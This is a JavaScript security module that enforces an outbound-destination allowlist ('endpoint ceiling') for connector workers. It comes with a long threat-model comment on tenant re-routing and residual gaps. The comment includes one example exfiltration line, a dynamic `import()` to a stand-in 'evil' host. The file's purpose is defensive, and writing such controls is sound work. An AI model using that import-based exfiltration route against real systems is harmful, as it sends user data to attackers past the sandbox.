// Endpoint ceiling — the seam-side destination control (spec 016-01, ADR-0006).
//
// Threat (ADR-0006): a connector's manifest DECLARES the endpoints it posts to,
// but nothing before this control HELD it to that declaration — a compromised
// chamber could post its `ready` egress to an ATTACKER-CONTROLLED destination
// and the async worker dispatch seam (`core/airlock.js`'s `worker.onmessage` ->
// `fetch(r.url)`) would send it unquestioned. This control flips `declared`
// from advisory to a CEILING: an outbound destination not in the declared set
// is HELD at the seal (fail closed, never a silent drop, never a
// chamber-killing throw — ADR-0006 §Consequences).
//
// Granularity is origin + PATHNAME, with query + fragment DROPPED before
// comparison. TWO match modes, selected PER DECLARED ENDPOINT by the declared
// endpoint's own shape (spec 046-02 AC4):
//   - EXACT (the default, and the ONLY mode before 046-02): the outbound
//     origin+path must EQUAL a declared origin+path. Every query-delimited
//     endpoint (GA4 `/g/collect`, `ccm/collect`, pixel `/tr`, alloy interact)
//     stays here — its path is fixed, its variability lives in the (dropped)
//     query, so exact origin+path is the correct, unweakened ceiling.
//   - SEGMENT-ANCHORED PREFIX (opt-in, 046-02): a declared endpoint whose PATH
//     itself carries a `;`-matrix segment (DoubleClick's Floodlight
//     `ad.doubleclick.net/activity;src=<id>`) admits an outbound whose
//     origin+path is the declared prefix, OR the declared prefix followed by a
//     `;` segment boundary. This is what lets the granted activity beacon
//     through despite the per-request `num`/`ord` CACHEBUSTER that rides its
//     PATH (a matrix-URI beacon has no query to hide the cachebuster in, so an
//     exact match could never hold). It does NOT weaken the ceiling: (a) it is
//     triggered ONLY by a `;` in the DECLARED path — no query-delimited
//     endpoint is affected; (b) the match is anchored from the origin through
//     the full declared identity prefix (`/activity;src=<id>`), so a different
//     origin or path is still held; (c) the `;`-boundary requirement means a
//     src-VALUE extension (`src=00000001` vs declared `src=0000000`) is held —
//     an attacker cannot lengthen a declared value to reach a new destination.
//
// The two granularities themselves:
//   - dropping the query resolves ADR-0006 Kill #4 — a site-configured
//     deploy-time URL legitimately carries tenant/secret query params (GA4's
//     `measurement_id`/`api_secret`, a cluster-hint), and a byte-exact URL
//     match would break on those, or force them into the manifest/disclosure
//     label (a secrets leak). Comparing origin+path keeps the ceiling correct
//     without ever needing to see those values.
//   - comparing the PATH (not just the origin) closes a gap `core/config-
//     integrity.js` (spec 015) does not cover: config-integrity pins a single
//     HOST + a tenant query key, but never inspects the pathname, so a
//     same-host, different-path destination would pass it unheld. This
//     control holds that case.
//
// NAMED RESIDUALS this control does NOT close (016-01 AC8 — stated, not
// hidden):
//   (i) tenant-in-query re-route: because the query is dropped, a compromised
//       chamber posting to the DECLARED origin+path but with an ATTACKER's
//       tenant key (e.g. GA4's `measurement_id`) in the query is ALLOWED by
//       this control — the same-host tenant re-route is `core/
//       config-integrity.js`'s job (spec 015), and is explicitly DEFERRED for
//       GA4 (016-01 AC8i).
//   (ii) dynamic `import()`: a `type:"module"` worker's `await
//       import("https://evil/x")` exfiltrates via the specifier fetch itself —
//       a language-level loader primitive no JS shim (this control included)
//       can withhold. Named by `core/egress-confinement.js` (spec 012-01 AC5)
//       and carried forward here; gated by a worker `connect-src` CSP where
//       the host controls response headers, not by this control.
//
// Vendor-neutral — no connector specifics. Every declared endpoint and every
// outbound URL is a plain string; the caller (e.g. a connector's manifest,
// `core/airlock.js`'s construction-time `endpoints`) supplies both.

/**
 * Reduce a URL to `origin + pathname`, dropping the query string and
 * fragment. `null` on anything that fails to parse — callers must treat that
 * as "cannot verify", never as an implicit allow.
 * @param {string} url
 * @returns {string | null}
 */
export function originPath(url) {
  try {
    const u = new URL(url, "https://airlock.local");
    return u.origin + u.pathname;
  } catch {
    return null;
  }
}

/**
 * Check an outbound URL against a connector's declared endpoints, at
 * origin+pathname granularity. FAILS CLOSED on every ambiguous case: an empty
 * declared set, or an unparseable outbound URL, both HOLD — this control
 * never treats "I can't tell" as "allow".
 * @param {string} url the outbound destination a chamber handed to the
 *   dispatch seam
 * @param {readonly string[]} declaredEndpoints the connector's declared
 *   endpoint URLs (as configured — query/fragment, if present, are dropped
 *   here too before comparison)
 * @returns {{ verdict: "allow" | "hold", destination: string | null, reason: string }}
 */
export function checkEndpointCeiling(url, declaredEndpoints) {
  const destination = originPath(url);

  // Partition the declared set by match mode, keyed on the DECLARED endpoint's
  // own shape (a `;` in its origin+path — origins never contain `;`, so this
  // reliably means a `;`-matrix PATH). Exact endpoints keep the strict, unchanged
  // set-membership match; matrix endpoints opt into the segment-anchored prefix.
  const exact = new Set();
  const prefixes = [];
  for (const endpoint of declaredEndpoints || []) {
    const reduced = originPath(endpoint);
    if (!reduced) continue;
    if (reduced.includes(";")) prefixes.push(reduced);
    else exact.add(reduced);
  }

  if (exact.size === 0 && prefixes.length === 0) {
    return { verdict: "hold", destination, reason: "endpoint-ceiling: no declared endpoints — fail closed (hold)" };
  }
  if (destination === null) {
    return { verdict: "hold", destination, reason: "endpoint-ceiling: unparseable outbound url — fail closed (hold)" };
  }
  if (exact.has(destination)) {
    return { verdict: "allow", destination, reason: "ok" };
  }
  // Segment-anchored prefix: the destination is the declared prefix itself, or
  // the declared prefix followed by a `;` (a new matrix segment) — never a bare
  // string startsWith, which would admit a value EXTENSION of the last declared
  // segment (`src=00000001` vs declared `src=0000000`).
  for (const prefix of prefixes) {
    if (destination === prefix || destination.startsWith(`${prefix};`)) {
      return { verdict: "allow", destination, reason: "ok" };
    }
  }
  return {
    verdict: "hold",
    destination,
    reason: `endpoint-ceiling: outbound ${destination} not in declared endpoints — held at the seal`,
  };
}
